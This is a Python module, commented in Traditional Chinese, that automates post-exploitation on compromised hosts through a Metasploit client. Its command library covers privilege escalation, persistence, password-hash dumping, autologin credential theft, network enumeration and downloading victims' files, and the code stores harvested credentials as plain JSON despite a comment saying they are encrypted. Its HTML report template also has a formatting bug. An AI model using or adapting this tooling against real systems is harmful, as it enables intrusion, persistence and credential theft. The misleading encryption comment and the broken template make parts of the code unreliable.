#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
後滲透模組
Post-Exploitation Module

提供後滲透操作功能
"""

import asyncio
import json
import time
import uuid
from typing import Dict, List, Any, Optional, Union, Tuple
from dataclasses import dataclass, field
from pathlib import Path
from enum import Enum

from ..core.logger import get_logger
from ..integrations.mcp_client import MetasploitMCPClient
from ..exploits.exploit_manager import ExploitSession, SessionType


class PostExploitTaskType(Enum):
    """
    後滲透任務類型
    """
    SYSTEM_INFO = "system_info"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    PERSISTENCE = "persistence"
    LATERAL_MOVEMENT = "lateral_movement"
    DATA_COLLECTION = "data_collection"
    NETWORK_DISCOVERY = "network_discovery"
    CREDENTIAL_HARVESTING = "credential_harvesting"
    FILE_OPERATIONS = "file_operations"
    REGISTRY_OPERATIONS = "registry_operations"
    PROCESS_OPERATIONS = "process_operations"
    NETWORK_OPERATIONS = "network_operations"
    CLEANUP = "cleanup"
    CUSTOM = "custom"


class TaskStatus(Enum):
    """
    任務狀態
    """
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    TIMEOUT = "timeout"
    CANCELLED = "cancelled"


@dataclass
class PostExploitCommand:
    """
    後滲透命令
    """
    command: str
    description: str
    task_type: PostExploitTaskType
    platform: List[str] = field(default_factory=list)  # windows, linux, generic
    session_types: List[SessionType] = field(default_factory=list)  # meterpreter, shell
    requires_admin: bool = False
    timeout: int = 60
    expected_output: Optional[str] = None
    cleanup_command: Optional[str] = None
    risk_level: str = "low"  # low, medium, high


@dataclass
class PostExploitTask:
    """
    後滲透任務
    """
    task_id: str
    session_id: int
    task_type: PostExploitTaskType
    commands: List[PostExploitCommand]
    status: TaskStatus = TaskStatus.PENDING
    start_time: Optional[float] = None
    end_time: Optional[float] = None
    duration: Optional[float] = None
    results: Dict[str, Any] = field(default_factory=dict)
    errors: List[str] = field(default_factory=list)
    output: str = ""
    progress: int = 0  # 0-100
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class SystemInfo:
    """
    系統信息
    """
    hostname: Optional[str] = None
    os_name: Optional[str] = None
    os_version: Optional[str] = None
    architecture: Optional[str] = None
    domain: Optional[str] = None
    username: Optional[str] = None
    privileges: Optional[str] = None
    process_id: Optional[int] = None
    process_name: Optional[str] = None
    network_interfaces: List[Dict[str, Any]] = field(default_factory=list)
    installed_software: List[str] = field(default_factory=list)
    running_processes: List[Dict[str, Any]] = field(default_factory=list)
    network_connections: List[Dict[str, Any]] = field(default_factory=list)
    environment_variables: Dict[str, str] = field(default_factory=dict)
    system_time: Optional[str] = None
    uptime: Optional[str] = None
    cpu_info: Optional[str] = None
    memory_info: Optional[str] = None
    disk_info: List[Dict[str, Any]] = field(default_factory=list)


@dataclass
class CollectedData:
    """
    收集的數據
    """
    data_type: str
    source: str
    content: Any
    timestamp: float
    file_path: Optional[str] = None
    size: Optional[int] = None
    hash_value: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)


class PostExploitManager:
    """
    後滲透管理器
    
    管理後滲透操作
    """
    
    def __init__(self, mcp_client: MetasploitMCPClient, config: Optional[Dict[str, Any]] = None):
        """
        初始化後滲透管理器
        
        Args:
            mcp_client: Metasploit MCP 客戶端
            config: 配置
        """
        self.mcp_client = mcp_client
        self.config = config or {}
        self.logger = get_logger()
        
        # 默認配置
        self.default_config = {
            'max_concurrent_tasks': 5,
            'default_timeout': 300,
            'auto_cleanup': True,
            'safe_mode': True,
            'data_collection_path': './collected_data',
            'max_file_size': 10 * 1024 * 1024,  # 10MB
            'allowed_extensions': ['.txt', '.log', '.conf', '.ini', '.xml', '.json'],
            'forbidden_paths': ['/etc/shadow', '/etc/passwd', 'C:\\Windows\\System32\\config\\SAM']
        }
        
        # 合併配置
        for key, value in self.default_config.items():
            if key not in self.config:
                self.config[key] = value
        
        # 內部狀態
        self.active_tasks: Dict[str, PostExploitTask] = {}
        self.collected_data: List[CollectedData] = []
        self.system_info_cache: Dict[int, SystemInfo] = {}
        
        # 預定義命令庫
        self.command_library = self._initialize_command_library()
        
        # 創建數據收集目錄
        Path(self.config['data_collection_path']).mkdir(parents=True, exist_ok=True)
    
    def _initialize_command_library(self) -> Dict[PostExploitTaskType, List[PostExploitCommand]]:
        """
        初始化命令庫
        
        Returns:
            命令庫
        """
        library = {
            PostExploitTaskType.SYSTEM_INFO: [
                PostExploitCommand(
                    command="sysinfo",
                    description="獲取系統信息",
                    task_type=PostExploitTaskType.SYSTEM_INFO,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows", "linux"]
                ),
                PostExploitCommand(
                    command="getuid",
                    description="獲取當前用戶ID",
                    task_type=PostExploitTaskType.SYSTEM_INFO,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows", "linux"]
                ),
                PostExploitCommand(
                    command="ps",
                    description="列出運行進程",
                    task_type=PostExploitTaskType.SYSTEM_INFO,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows", "linux"]
                ),
                PostExploitCommand(
                    command="ipconfig",
                    description="獲取網絡配置",
                    task_type=PostExploitTaskType.SYSTEM_INFO,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows"]
                ),
                PostExploitCommand(
                    command="ifconfig",
                    description="獲取網絡配置",
                    task_type=PostExploitTaskType.SYSTEM_INFO,
                    session_types=[SessionType.METERPRETER],
                    platform=["linux"]
                ),
                PostExploitCommand(
                    command="whoami",
                    description="獲取當前用戶",
                    task_type=PostExploitTaskType.SYSTEM_INFO,
                    session_types=[SessionType.SHELL],
                    platform=["windows", "linux"]
                ),
                PostExploitCommand(
                    command="uname -a",
                    description="獲取系統信息",
                    task_type=PostExploitTaskType.SYSTEM_INFO,
                    session_types=[SessionType.SHELL],
                    platform=["linux"]
                ),
                PostExploitCommand(
                    command="systeminfo",
                    description="獲取系統信息",
                    task_type=PostExploitTaskType.SYSTEM_INFO,
                    session_types=[SessionType.SHELL],
                    platform=["windows"]
                )
            ],
            
            PostExploitTaskType.PRIVILEGE_ESCALATION: [
                PostExploitCommand(
                    command="getsystem",
                    description="嘗試提升到SYSTEM權限",
                    task_type=PostExploitTaskType.PRIVILEGE_ESCALATION,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows"],
                    risk_level="high"
                ),
                PostExploitCommand(
                    command="use priv",
                    description="加載特權擴展",
                    task_type=PostExploitTaskType.PRIVILEGE_ESCALATION,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows"]
                ),
                PostExploitCommand(
                    command="run post/windows/escalate/getsystem",
                    description="運行權限提升模組",
                    task_type=PostExploitTaskType.PRIVILEGE_ESCALATION,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows"],
                    risk_level="high"
                )
            ],
            
            PostExploitTaskType.PERSISTENCE: [
                PostExploitCommand(
                    command="run persistence -X",
                    description="建立持久化連接",
                    task_type=PostExploitTaskType.PERSISTENCE,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows"],
                    requires_admin=True,
                    risk_level="high"
                ),
                PostExploitCommand(
                    command="run post/windows/manage/persistence_exe",
                    description="創建持久化可執行文件",
                    task_type=PostExploitTaskType.PERSISTENCE,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows"],
                    requires_admin=True,
                    risk_level="high"
                )
            ],
            
            PostExploitTaskType.CREDENTIAL_HARVESTING: [
                PostExploitCommand(
                    command="hashdump",
                    description="導出密碼哈希",
                    task_type=PostExploitTaskType.CREDENTIAL_HARVESTING,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows"],
                    requires_admin=True,
                    risk_level="high"
                ),
                PostExploitCommand(
                    command="run post/windows/gather/credentials/windows_autologin",
                    description="收集自動登錄憑證",
                    task_type=PostExploitTaskType.CREDENTIAL_HARVESTING,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows"]
                ),
                PostExploitCommand(
                    command="run post/windows/gather/smart_hashdump",
                    description="智能哈希導出",
                    task_type=PostExploitTaskType.CREDENTIAL_HARVESTING,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows"],
                    requires_admin=True,
                    risk_level="high"
                )
            ],
            
            PostExploitTaskType.NETWORK_DISCOVERY: [
                PostExploitCommand(
                    command="run post/windows/gather/arp_scanner",
                    description="ARP掃描網絡",
                    task_type=PostExploitTaskType.NETWORK_DISCOVERY,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows"]
                ),
                PostExploitCommand(
                    command="run post/windows/gather/enum_domain",
                    description="枚舉域信息",
                    task_type=PostExploitTaskType.NETWORK_DISCOVERY,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows"]
                ),
                PostExploitCommand(
                    command="netstat -an",
                    description="查看網絡連接",
                    task_type=PostExploitTaskType.NETWORK_DISCOVERY,
                    session_types=[SessionType.SHELL],
                    platform=["windows", "linux"]
                ),
                PostExploitCommand(
                    command="arp -a",
                    description="查看ARP表",
                    task_type=PostExploitTaskType.NETWORK_DISCOVERY,
                    session_types=[SessionType.SHELL],
                    platform=["windows", "linux"]
                )
            ],
            
            PostExploitTaskType.DATA_COLLECTION: [
                PostExploitCommand(
                    command="run post/windows/gather/enum_applications",
                    description="枚舉已安裝應用程序",
                    task_type=PostExploitTaskType.DATA_COLLECTION,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows"]
                ),
                PostExploitCommand(
                    command="run post/windows/gather/enum_logged_on_users",
                    description="枚舉登錄用戶",
                    task_type=PostExploitTaskType.DATA_COLLECTION,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows"]
                ),
                PostExploitCommand(
                    command="search -f *.txt",
                    description="搜索文本文件",
                    task_type=PostExploitTaskType.DATA_COLLECTION,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows", "linux"]
                ),
                PostExploitCommand(
                    command="search -f *.log",
                    description="搜索日誌文件",
                    task_type=PostExploitTaskType.DATA_COLLECTION,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows", "linux"]
                )
            ],
            
            PostExploitTaskType.FILE_OPERATIONS: [
                PostExploitCommand(
                    command="pwd",
                    description="顯示當前目錄",
                    task_type=PostExploitTaskType.FILE_OPERATIONS,
                    session_types=[SessionType.METERPRETER, SessionType.SHELL],
                    platform=["windows", "linux"]
                ),
                PostExploitCommand(
                    command="ls",
                    description="列出文件",
                    task_type=PostExploitTaskType.FILE_OPERATIONS,
                    session_types=[SessionType.METERPRETER],
                    platform=["windows", "linux"]
                ),
                PostExploitCommand(
                    command="dir",
                    description="列出文件",
                    task_type=PostExploitTaskType.FILE_OPERATIONS,
                    session_types=[SessionType.SHELL],
                    platform=["windows"]
                )
            ]
        }
        
        return library
    
    async def execute_post_exploit_task(self, session: ExploitSession,
                                       task_type: PostExploitTaskType,
                                       custom_commands: Optional[List[str]] = None,
                                       **kwargs) -> PostExploitTask:
        """
        執行後滲透任務
        
        Args:
            session: 漏洞利用會話
            task_type: 任務類型
            custom_commands: 自定義命令列表
            **kwargs: 其他參數
            
        Returns:
            後滲透任務
        """
        task_id = f"post_exploit_{int(time.time())}_{str(uuid.uuid4())[:8]}"
        
        self.logger.info(f"開始後滲透任務: {task_type.value}", {
            "task_id": task_id,
            "session_id": session.session_id
        })
        
        # 選擇命令
        if custom_commands:
            commands = [PostExploitCommand(
                command=cmd,
                description=f"自定義命令: {cmd}",
                task_type=PostExploitTaskType.CUSTOM,
                session_types=[session.session_type],
                platform=[session.platform or "generic"]
            ) for cmd in custom_commands]
        else:
            commands = self._select_commands(task_type, session)
        
        if not commands:
            raise ValueError(f"沒有找到適用於 {task_type.value} 的命令")
        
        # 創建任務
        task = PostExploitTask(
            task_id=task_id,
            session_id=session.session_id,
            task_type=task_type,
            commands=commands,
            start_time=time.time(),
            status=TaskStatus.RUNNING
        )
        
        self.active_tasks[task_id] = task
        
        try:
            # 執行命令
            await self._execute_task_commands(task, session)
            
            # 處理結果
            await self._process_task_results(task, session)
            
            task.status = TaskStatus.COMPLETED
            task.progress = 100
            
            self.logger.info(f"後滲透任務完成: {task_type.value}", {
                "task_id": task_id,
                "duration": task.duration
            })
            
        except asyncio.TimeoutError:
            task.status = TaskStatus.TIMEOUT
            task.errors.append("任務執行超時")
            
        except Exception as e:
            task.status = TaskStatus.FAILED
            task.errors.append(str(e))
            self.logger.error(f"後滲透任務失敗: {e}", {
                "task_id": task_id
            }, exc_info=True)
        
        finally:
            task.end_time = time.time()
            if task.start_time:
                task.duration = task.end_time - task.start_time
            
            # 清理
            if task_id in self.active_tasks:
                del self.active_tasks[task_id]
        
        return task
    
    def _select_commands(self, task_type: PostExploitTaskType,
                        session: ExploitSession) -> List[PostExploitCommand]:
        """
        選擇適用的命令
        
        Args:
            task_type: 任務類型
            session: 會話
            
        Returns:
            命令列表
        """
        available_commands = self.command_library.get(task_type, [])
        selected_commands = []
        
        for command in available_commands:
            # 檢查會話類型
            if session.session_type not in command.session_types:
                continue
            
            # 檢查平台
            if command.platform and session.platform:
                if session.platform.lower() not in [p.lower() for p in command.platform]:
                    continue
            
            # 檢查權限要求
            if command.requires_admin and not self._has_admin_privileges(session):
                if not self.config.get('ignore_privilege_requirements', False):
                    continue
            
            # 安全模式檢查
            if self.config['safe_mode'] and command.risk_level == "high":
                continue
            
            selected_commands.append(command)
        
        return selected_commands
    
    def _has_admin_privileges(self, session: ExploitSession) -> bool:
        """
        檢查是否有管理員權限
        
        Args:
            session: 會話
            
        Returns:
            是否有管理員權限
        """
        if session.privileges:
            admin_indicators = ['administrator', 'root', 'system', 'admin']
            return any(indicator in session.privileges.lower() for indicator in admin_indicators)
        
        return False
    
    async def _execute_task_commands(self, task: PostExploitTask, session: ExploitSession):
        """
        執行任務命令
        
        Args:
            task: 任務
            session: 會話
        """
        total_commands = len(task.commands)
        
        for i, command in enumerate(task.commands):
            try:
                self.logger.info(f"執行命令: {command.command}", {
                    "task_id": task.task_id,
                    "command_index": i + 1,
                    "total_commands": total_commands
                })
                
                # 執行命令
                result = await asyncio.wait_for(
                    self.mcp_client.send_session_command(
                        session_id=session.session_id,
                        command=command.command,
                        timeout_seconds=command.timeout
                    ),
                    timeout=command.timeout
                )
                
                # 存儲結果
                task.results[command.command] = {
                    'status': result.get('status', 'unknown'),
                    'output': result.get('output', ''),
                    'timestamp': time.time(),
                    'description': command.description
                }
                
                task.output += f"\n=== {command.description} ===\n"
                task.output += result.get('output', '') + "\n"
                
                # 更新進度
                task.progress = int((i + 1) / total_commands * 100)
                
            except asyncio.TimeoutError:
                error_msg = f"命令執行超時: {command.command}"
                task.errors.append(error_msg)
                self.logger.warning(error_msg, {"task_id": task.task_id})
                
            except Exception as e:
                error_msg = f"命令執行失敗 {command.command}: {str(e)}"
                task.errors.append(error_msg)
                self.logger.error(error_msg, {"task_id": task.task_id})
    
    async def _process_task_results(self, task: PostExploitTask, session: ExploitSession):
        """
        處理任務結果
        
        Args:
            task: 任務
            session: 會話
        """
        if task.task_type == PostExploitTaskType.SYSTEM_INFO:
            await self._process_system_info(task, session)
        elif task.task_type == PostExploitTaskType.DATA_COLLECTION:
            await self._process_data_collection(task, session)
        elif task.task_type == PostExploitTaskType.CREDENTIAL_HARVESTING:
            await self._process_credential_harvesting(task, session)
        elif task.task_type == PostExploitTaskType.NETWORK_DISCOVERY:
            await self._process_network_discovery(task, session)
    
    async def _process_system_info(self, task: PostExploitTask, session: ExploitSession):
        """
        處理系統信息
        
        Args:
            task: 任務
            session: 會話
        """
        system_info = SystemInfo()
        
        for command, result in task.results.items():
            output = result.get('output', '')
            
            if 'sysinfo' in command.lower():
                # 解析 sysinfo 輸出
                lines = output.split('\n')
                for line in lines:
                    if ':' in line:
                        key, value = line.split(':', 1)
                        key = key.strip().lower()
                        value = value.strip()
                        
                        if 'computer' in key or 'hostname' in key:
                            system_info.hostname = value
                        elif 'os' in key and 'name' in key:
                            system_info.os_name = value
                        elif 'os' in key and 'version' in key:
                            system_info.os_version = value
                        elif 'architecture' in key:
                            system_info.architecture = value
                        elif 'domain' in key:
                            system_info.domain = value
            
            elif 'getuid' in command.lower() or 'whoami' in command.lower():
                system_info.username = output.strip()
            
            elif 'ps' in command.lower():
                # 解析進程列表
                processes = self._parse_process_list(output)
                system_info.running_processes = processes
            
            elif 'ipconfig' in command.lower() or 'ifconfig' in command.lower():
                # 解析網絡接口
                interfaces = self._parse_network_interfaces(output)
                system_info.network_interfaces = interfaces
        
        # 緩存系統信息
        self.system_info_cache[session.session_id] = system_info
        
        # 添加到任務元數據
        task.metadata['system_info'] = {
            'hostname': system_info.hostname,
            'os_name': system_info.os_name,
            'os_version': system_info.os_version,
            'username': system_info.username,
            'architecture': system_info.architecture,
            'domain': system_info.domain
        }
    
    def _parse_process_list(self, output: str) -> List[Dict[str, Any]]:
        """
        解析進程列表
        
        Args:
            output: 命令輸出
            
        Returns:
            進程列表
        """
        processes = []
        lines = output.split('\n')
        
        for line in lines[1:]:  # 跳過標題行
            if line.strip():
                parts = line.split()
                if len(parts) >= 3:
                    try:
                        process = {
                            'pid': int(parts[0]) if parts[0].isdigit() else None,
                            'name': parts[1] if len(parts) > 1 else '',
                            'path': ' '.join(parts[2:]) if len(parts) > 2 else ''
                        }
                        processes.append(process)
                    except (ValueError, IndexError):
                        continue
        
        return processes
    
    def _parse_network_interfaces(self, output: str) -> List[Dict[str, Any]]:
        """
        解析網絡接口
        
        Args:
            output: 命令輸出
            
        Returns:
            網絡接口列表
        """
        interfaces = []
        current_interface = None
        
        lines = output.split('\n')
        for line in lines:
            line = line.strip()
            
            # Windows ipconfig 格式
            if 'adapter' in line.lower() or 'ethernet' in line.lower():
                if current_interface:
                    interfaces.append(current_interface)
                current_interface = {'name': line, 'addresses': []}
            
            elif current_interface and 'ip' in line.lower() and ':' in line:
                parts = line.split(':')
                if len(parts) >= 2:
                    ip_address = parts[1].strip()
                    current_interface['addresses'].append(ip_address)
            
            # Linux ifconfig 格式
            elif ':' in line and 'inet' in line:
                parts = line.split()
                for part in parts:
                    if 'addr:' in part:
                        ip_address = part.split(':')[1]
                        if current_interface:
                            current_interface['addresses'].append(ip_address)
        
        if current_interface:
            interfaces.append(current_interface)
        
        return interfaces
    
    async def _process_data_collection(self, task: PostExploitTask, session: ExploitSession):
        """
        處理數據收集
        
        Args:
            task: 任務
            session: 會話
        """
        collected_files = []
        
        for command, result in task.results.items():
            output = result.get('output', '')
            
            if 'search' in command.lower():
                # 解析搜索結果
                file_paths = self._parse_search_results(output)
                
                # 下載文件（如果配置允許）
                for file_path in file_paths[:10]:  # 限制數量
                    try:
                        await self._download_file(session.session_id, file_path)
                        collected_files.append(file_path)
                    except Exception as e:
                        self.logger.warning(f"下載文件失敗 {file_path}: {e}")
        
        task.metadata['collected_files'] = collected_files
    
    def _parse_search_results(self, output: str) -> List[str]:
        """
        解析搜索結果
        
        Args:
            output: 搜索輸出
            
        Returns:
            文件路徑列表
        """
        file_paths = []
        lines = output.split('\n')
        
        for line in lines:
            line = line.strip()
            if line and ('\\' in line or '/' in line):
                # 簡單的文件路徑檢測
                if any(ext in line.lower() for ext in self.config['allowed_extensions']):
                    file_paths.append(line)
        
        return file_paths
    
    async def _download_file(self, session_id: int, remote_path: str):
        """
        下載文件
        
        Args:
            session_id: 會話 ID
            remote_path: 遠程文件路徑
        """
        # 檢查文件路徑是否被禁止
        for forbidden_path in self.config['forbidden_paths']:
            if forbidden_path.lower() in remote_path.lower():
                raise ValueError(f"禁止訪問的路徑: {remote_path}")
        
        # 生成本地文件名
        filename = Path(remote_path).name
        local_path = Path(self.config['data_collection_path']) / f"{session_id}_{int(time.time())}_{filename}"
        
        try:
            # 使用 Meterpreter download 命令
            result = await self.mcp_client.send_session_command(
                session_id=session_id,
                command=f"download {remote_path} {local_path}"
            )
            
            if result.get('status') == 'success':
                # 記錄收集的數據
                data = CollectedData(
                    data_type="file",
                    source=remote_path,
                    content=str(local_path),
                    timestamp=time.time(),
                    file_path=str(local_path)
                )
                
                self.collected_data.append(data)
                
                self.logger.info(f"文件下載成功: {remote_path} -> {local_path}")
            
        except Exception as e:
            self.logger.error(f"文件下載失敗: {e}")
            raise
    
    async def _process_credential_harvesting(self, task: PostExploitTask, session: ExploitSession):
        """
        處理憑證收集
        
        Args:
            task: 任務
            session: 會話
        """
        credentials = []
        
        for command, result in task.results.items():
            output = result.get('output', '')
            
            if 'hashdump' in command.lower():
                # 解析密碼哈希
                hashes = self._parse_password_hashes(output)
                credentials.extend(hashes)
            
            elif 'autologin' in command.lower():
                # 解析自動登錄憑證
                autologin_creds = self._parse_autologin_credentials(output)
                credentials.extend(autologin_creds)
        
        # 保存憑證（加密存儲）
        if credentials:
            cred_file = Path(self.config['data_collection_path']) / f"credentials_{session.session_id}_{int(time.time())}.json"
            
            with open(cred_file, 'w', encoding='utf-8') as f:
                json.dump(credentials, f, indent=2)
            
            task.metadata['credentials_file'] = str(cred_file)
            task.metadata['credentials_count'] = len(credentials)
    
    def _parse_password_hashes(self, output: str) -> List[Dict[str, str]]:
        """
        解析密碼哈希
        
        Args:
            output: hashdump 輸出
            
        Returns:
            哈希列表
        """
        hashes = []
        lines = output.split('\n')
        
        for line in lines:
            if ':' in line and len(line.split(':')) >= 4:
                parts = line.split(':')
                if len(parts) >= 4:
                    hash_entry = {
                        'username': parts[0],
                        'uid': parts[1],
                        'lm_hash': parts[2],
                        'ntlm_hash': parts[3],
                        'type': 'windows_hash'
                    }
                    hashes.append(hash_entry)
        
        return hashes
    
    def _parse_autologin_credentials(self, output: str) -> List[Dict[str, str]]:
        """
        解析自動登錄憑證
        
        Args:
            output: 自動登錄輸出
            
        Returns:
            憑證列表
        """
        credentials = []
        lines = output.split('\n')
        
        current_cred = {}
        for line in lines:
            if ':' in line:
                key, value = line.split(':', 1)
                key = key.strip().lower()
                value = value.strip()
                
                if 'username' in key:
                    current_cred['username'] = value
                elif 'password' in key:
                    current_cred['password'] = value
                elif 'domain' in key:
                    current_cred['domain'] = value
                
                if 'username' in current_cred and 'password' in current_cred:
                    current_cred['type'] = 'autologin'
                    credentials.append(current_cred.copy())
                    current_cred = {}
        
        return credentials
    
    async def _process_network_discovery(self, task: PostExploitTask, session: ExploitSession):
        """
        處理網絡發現
        
        Args:
            task: 任務
            session: 會話
        """
        network_info = {
            'hosts': [],
            'connections': [],
            'arp_entries': []
        }
        
        for command, result in task.results.items():
            output = result.get('output', '')
            
            if 'arp' in command.lower():
                # 解析 ARP 表
                arp_entries = self._parse_arp_table(output)
                network_info['arp_entries'] = arp_entries
            
            elif 'netstat' in command.lower():
                # 解析網絡連接
                connections = self._parse_network_connections(output)
                network_info['connections'] = connections
        
        task.metadata['network_discovery'] = network_info
    
    def _parse_arp_table(self, output: str) -> List[Dict[str, str]]:
        """
        解析 ARP 表
        
        Args:
            output: ARP 輸出
            
        Returns:
            ARP 條目列表
        """
        arp_entries = []
        lines = output.split('\n')
        
        for line in lines:
            parts = line.split()
            if len(parts) >= 3 and '.' in parts[0]:  # IP 地址格式
                entry = {
                    'ip_address': parts[0],
                    'mac_address': parts[1] if len(parts) > 1 else '',
                    'type': parts[2] if len(parts) > 2 else ''
                }
                arp_entries.append(entry)
        
        return arp_entries
    
    def _parse_network_connections(self, output: str) -> List[Dict[str, str]]:
        """
        解析網絡連接
        
        Args:
            output: netstat 輸出
            
        Returns:
            連接列表
        """
        connections = []
        lines = output.split('\n')
        
        for line in lines:
            parts = line.split()
            if len(parts) >= 4 and ('TCP' in parts[0] or 'UDP' in parts[0]):
                connection = {
                    'protocol': parts[0],
                    'local_address': parts[1],
                    'foreign_address': parts[2],
                    'state': parts[3] if len(parts) > 3 else ''
                }
                connections.append(connection)
        
        return connections
    
    async def get_system_info(self, session_id: int) -> Optional[SystemInfo]:
        """
        獲取系統信息
        
        Args:
            session_id: 會話 ID
            
        Returns:
            系統信息
        """
        return self.system_info_cache.get(session_id)
    
    def get_collected_data(self, session_id: Optional[int] = None) -> List[CollectedData]:
        """
        獲取收集的數據
        
        Args:
            session_id: 會話 ID（可選）
            
        Returns:
            收集的數據列表
        """
        if session_id is None:
            return self.collected_data
        
        # 根據文件路徑過濾（包含會話 ID）
        return [data for data in self.collected_data 
                if data.file_path and f"{session_id}_" in data.file_path]
    
    def export_task_report(self, task: PostExploitTask, output_path: str, format_type: str = "json"):
        """
        導出任務報告
        
        Args:
            task: 任務
            output_path: 輸出路徑
            format_type: 格式類型
        """
        output_path = Path(output_path)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        
        if format_type.lower() == "json":
            self._export_json_task_report(task, output_path)
        elif format_type.lower() == "html":
            self._export_html_task_report(task, output_path)
        else:
            raise ValueError(f"不支持的格式: {format_type}")
        
        self.logger.info(f"任務報告已導出: {output_path}")
    
    def _export_json_task_report(self, task: PostExploitTask, output_path: Path):
        """
        導出 JSON 格式任務報告
        """
        data = {
            'task_info': {
                'task_id': task.task_id,
                'session_id': task.session_id,
                'task_type': task.task_type.value,
                'status': task.status.value,
                'start_time': task.start_time,
                'end_time': task.end_time,
                'duration': task.duration,
                'progress': task.progress
            },
            'commands': [{
                'command': cmd.command,
                'description': cmd.description,
                'platform': cmd.platform,
                'risk_level': cmd.risk_level
            } for cmd in task.commands],
            'results': task.results,
            'metadata': task.metadata,
            'errors': task.errors,
            'output': task.output
        }
        
        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    
    def _export_html_task_report(self, task: PostExploitTask, output_path: Path):
        """
        導出 HTML 格式任務報告
        """
        html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>後滲透任務報告</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background: #f0f0f0; padding: 20px; border-radius: 5px; }
        .status-completed { color: #4caf50; }
        .status-failed { color: #f44336; }
        .command-item { border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; }
        .output { background: #f5f5f5; padding: 10px; border-radius: 3px; white-space: pre-wrap; }
        .metadata { background: #e3f2fd; padding: 10px; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>後滲透任務報告</h1>
        <p><strong>任務ID:</strong> {task_id}</p>
        <p><strong>會話ID:</strong> {session_id}</p>
        <p><strong>任務類型:</strong> {task_type}</p>
        <p><strong>狀態:</strong> <span class="status-{status}">{status}</span></p>
        <p><strong>持續時間:</strong> {duration:.2f} 秒</p>
    </div>
    
    <h2>執行的命令</h2>
    {commands}
    
    <h2>輸出結果</h2>
    <div class="output">{output}</div>
    
    <h2>元數據</h2>
    <div class="metadata">{metadata}</div>
</body>
</html>
        """
        
        # 生成命令列表 HTML
        commands_html = ""
        for cmd in task.commands:
            command_item = f"""
            <div class="command-item">
                <h4>{cmd.description}</h4>
                <p><strong>命令:</strong> <code>{cmd.command}</code></p>
                <p><strong>平台:</strong> {', '.join(cmd.platform)}</p>
                <p><strong>風險級別:</strong> {cmd.risk_level}</p>
            </div>
            """
            commands_html += command_item
        
        # 格式化元數據
        metadata_html = json.dumps(task.metadata, indent=2, ensure_ascii=False)
        
        # 填充模板
        html_content = html_template.format(
            task_id=task.task_id,
            session_id=task.session_id,
            task_type=task.task_type.value,
            status=task.status.value,
            duration=task.duration or 0,
            commands=commands_html,
            output=task.output,
            metadata=metadata_html
        )
        
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(html_content)